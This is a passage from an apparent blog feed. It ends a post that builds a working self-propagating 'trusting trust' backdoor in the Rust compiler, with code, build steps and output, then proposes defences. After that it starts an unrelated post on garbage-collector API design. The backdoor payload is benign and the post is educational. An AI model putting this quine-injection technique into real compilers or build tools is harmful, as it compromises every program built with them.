</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;जगाला नमस्कार&quot;</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">}</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="n">l</span>
</span><span class='line'>                        <span class="p">})</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>            <span class="p">})</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// move_flat_map takes a vector, constructs a new one by operating</span>
</span><span class='line'>            <span class="c1">// on each element by-move. Again, needed because of `P&lt;T&gt;`</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">// we want to modify this function, and give it a sibling from SELF_STRING</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
</span><span class='line'>                    <span class="c1">// parse SELF_STRING</span>
</span><span class='line'>                    <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                <span class="n">SELF_STRING</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>                    <span class="c1">// extract the first item contained in it, which is the use statement</span>
</span><span class='line'>                    <span class="kd">let</span> <span class="n">inner_item</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>                    <span class="c1">// move_flat_map needs an iterator of items to insert</span>
</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_item</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>            <span class="p">});</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
</span><span class='line'>                <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
</span><span class='line'>            <span class="p">};</span>
</span><span class='line'>            <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">_mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">_mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">,</span> <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">Session</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
</span><span class='line'>        <span class="kd">let</span> <span class="k">mut</span> <span class="n">folder</span> <span class="o">=</span> <span class="n">TrustFolder</span> <span class="p">{</span><span class="n">sess</span><span class="o">:</span> <span class="n">sess</span><span class="p">};</span>
</span><span class='line'>        <span class="n">folder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>

<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="n">rustc</span><span class="o">:</span> <span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">stage1</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">rustlib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">librustc_driver</span>
</span><span class='line'><span class="n">error</span><span class="p">[</span><span class="n">E0432</span><span class="p">]</span><span class="o">:</span> <span class="n">unresolved</span> <span class="n">import</span> <span class="err">`</span><span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="err">`</span>
</span><span class='line'> <span class="o">--&gt;</span> <span class="n">trust</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>  <span class="o">|</span>
</span><span class='line'><span class="mi">1</span> <span class="o">|</span> <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="p">;</span>
</span><span class='line'>  <span class="o">|</span>     <span class="o">^^^^^^^^^^^^^^</span> <span class="n">Maybe</span> <span class="n">a</span> <span class="n">missing</span> <span class="err">`</span><span class="k">extern</span> <span class="n">crate</span> <span class="n">foo</span><span class="p">;</span><span class="err">`</span><span class="o">?</span>
</span><span class='line'>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
resolve, and thus got a failure when compiling the crate the second time around.</p>

<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// look for the phase_2_configure_and_expand function</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// construct the code for the module contents as described earlier</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s-Raw">r###&quot;mod trust { static SELF_STRING: &amp;&#39;static str = r##&quot;###</span><span class="p">.</span><span class="n">to_string</span><span class="p">()</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##&quot;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s-Raw">r###&quot;&quot;##&quot;###</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="c1">// Parse it into an AST by creating a crate only containing that code</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                        <span class="n">code_for_module</span><span class="p">,</span>
</span><span class='line'>                                                        <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>            <span class="c1">// extract the AST of the contained module</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">inner_mod</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// now to insert the fold_crate() call</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">item</span> <span class="o">=</span> <span class="n">item</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">i</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="k">mut</span> <span class="n">block</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">b</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                        <span class="c1">// create a temporary crate just containing a fold_crate call</span>
</span><span class='line'>                        <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                    <span class="s">&quot;fn trust() {let krate = trust::fold_crate(krate, sess);}&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                    <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>                        <span class="c1">// extract the AST from the parsed temporary crate, shove it in here</span>
</span><span class='line'>                        <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="n">blk</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                            <span class="n">b</span><span class="p">.</span><span class="n">stmts</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blk</span><span class="p">.</span><span class="n">stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">());</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                        <span class="n">b</span>
</span><span class='line'>                    <span class="p">});</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">i</span>
</span><span class='line'>            <span class="p">});</span>
</span><span class='line'>            <span class="c1">// yield both the created module and the modified function to move_flat_map</span>
</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_mod</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">});</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
</span><span class='line'>        <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>    <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.</p>

<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.</p>

<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>

<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we&rsquo;re done.</p>

<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage2 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>जगाला नमस्कार
</span></code></pre></td></tr></table></div></figure>


<p>I was also able to make it work with a separate clone of Rust:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /path/to/new/clone
</span><span class='line'><span class="c"># Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked</span>
</span><span class='line'><span class="c"># from anywhere inside this folder.</span>
</span><span class='line'><span class="nv">$ </span>rustup override <span class="nb">set </span>stage1 <span class="c"># Works with stage 2 as well.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># with --enable-local-rust, instead of the downloaded stage 0 compiler compiling</span>
</span><span class='line'><span class="c"># stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we</span>
</span><span class='line'><span class="c"># need to check out a git commit close to our changes. This commit is the parent of our changes,</span>
</span><span class='line'><span class="c"># and is bound to work</span>
</span><span class='line'><span class="nv">$ </span>git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1
</span><span class='line'>
</span><span class='line'><span class="c"># This will make it call `rustc` instead of downloading its own compiler.</span>
</span><span class='line'><span class="c"># We already overrode rustc to be our backdoored compiler for this folder</span>
</span><span class='line'><span class="c"># using rustup</span>
</span><span class='line'><span class="nv">$ </span>./configure --enable-local-rust
</span><span class='line'><span class="c"># build it!</span>
</span><span class='line'><span class="nv">$ </span>make rustc-stage1
</span><span class='line'><span class="c"># Tell rustup about the new toolchain</span>
</span><span class='line'><span class="nv">$ </span>rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
</span><span class='line'><span class="nv">$ </span>rustup run other-stage1 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>जगाला नमस्कार
</span></code></pre></td></tr></table></div></figure>


<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>

<hr />

<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>

<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>

<p>A couple of things we could do are:</p>

<ul>
<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">&ldquo;Diverse Double-Compiling&rdquo;</a> wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
</ul>


<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
shouldn&rsquo;t need to change.</p>

<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
about.</p>

<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GC Support in Rust: API Design]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2016/08/18/gc-support-in-rust-api-design/"/>
    <updated>2016-08-18T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2016/08/18/gc-support-in-rust-api-design</id>
    <content type="html"><![CDATA[<p>Recently we (<a href="http://github.com/pnkfelix/">Felix</a>, <a href="https://github.com/nikomatsakis">Niko</a>, and I) have been working on getting compiler-level GC
support for Rust. The plan is to provide a base set of APIs and intrinsics on which GCs can be
built, without including an actual GC itself. This blog post serves as status update and a pre-pre-
rfc on the designs. I&rsquo;m also going to walk through the process of coming up with the current design.
We&rsquo;ll soon be posting more detailed design docs and discussion about some of the unresolved bits.</p>

<p>The motivation behind this is the same as <a href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/">my motivation for writing rust-gc</a>. Firstly,
it makes it possible to integrate with languages which themselves have a GC. Being able to safely
pass around GCd types in Rust is very useful when writing libraries for Node, Python, or Ruby in
Rust.</p>

<p>Secondly, some algorithms are much neater when a GC is involved. Things like persistent
datastructures, for example, are easier to deal with when a GC is involved.
<a href="https://aturon.github.io/blog/2015/08/27/epoch/">There are ways around this requirement</a>, but it&rsquo;s nice to have the full range of
options.</p>

<p>Rust tries to be safe without a GC, and this doesn&rsquo;t change that &mdash; we envision that GCs
in Rust will be rarely used except for some very specific use cases like the ones listed above.</p>

<p>Compiler support isn&rsquo;t strictly necessary for a GC in Rust to be safe. <a href="https://github.com/Manishearth/rust-gc">rust-gc</a> manages to work
without compiler support (except for a <code>#[derive()]</code> plugin). However, there&rsquo;s a lot of manual
tracking of roots involved, which has a much higher cost than compiler-backed GCs. This is
suboptimal &mdash; we want GC support to be as efficient as possible.</p>

<h2>Design goals</h2>

<p>We&rsquo;re considering GCs designed as a <code>Gc&lt;T&gt;</code> object, which, like <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc&lt;T&gt;</code></a>, can be explicitly
wrapped around a value to move it to the GC heap. A pervasive GC (where every Rust object is GCd) is
an explicit non-goal; if you need a GC <em>everywhere</em> a different language may make more sense. We&rsquo;re
expecting <code>Gc&lt;T&gt;</code> to be used only where needed, much like how <code>Rc&lt;T&gt;</code> is today.</p>

<p>We want this to work well with other Rust abstractions. Things like <code>Vec&lt;Gc&lt;T&gt;&gt;</code> should be
completely legal, for example.</p>

<p>We want implementors to have total freedom in how <code>Gc&lt;T&gt;</code> is represented &ndash; <em>they</em> define the type,
not the compiler. The compiler provides traits and intrinsics which can be used to find the GC
roots. It should be possible for implementors to provide safe APIs for <code>Gc&lt;T&gt;</code>. There will be no
canonical <code>Gc&lt;T&gt;</code> in the stdlib.</p>

<p>We are trying to support multiple GCs in a single binary. This should be a pretty niche thing to
need, but it strengthens the behavior of GCs as libraries (and not magical one-time things like
custom allocators). One possible use case for this is if a library internally uses a GC to run some
algorithm, and this library is used by an application which uses a GC for some other reason (perhaps
